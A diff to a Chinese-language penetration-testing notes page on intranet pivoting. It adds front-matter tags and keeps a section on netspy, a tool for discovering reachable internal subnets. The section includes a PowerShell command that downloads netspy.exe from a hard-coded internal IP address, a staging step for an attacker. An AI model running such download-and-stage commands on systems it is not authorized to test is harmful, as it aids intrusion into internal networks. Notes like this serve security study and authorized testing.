@@ -1,5 +1,11 @@
 ---
-
+category:
+  - 网络安全
+  - 内网渗透
+tags:
+  - 网络安全
+  - 内网渗透
+excerpt: 内网渗透技术索引页，涵盖远程登录方式（RDP/Telnet/SSH）、内网信息收集与代理转发等主题。
 ---
 
 # 内网渗透
@@ -38,13 +44,10 @@
 
 ### netspy
 
-> netspy是一款快速探测内网可达网段工具(深信服深蓝实验室天威战队强力驱动) 
+> netspy是一款快速探测内网可达网段工具(深信服深蓝实验室天威战队强力驱动)
 
 可以在 [Releases · shmilylty/netspy (github.com)](https://github.com/shmilylty/netspy/releases) 下载可执行文件压缩包
-
 
 ```
 iwr -Uri http://100.1.1.138:8000/download/netspy.exe -OutFile netspy.exe
 ```
-
-
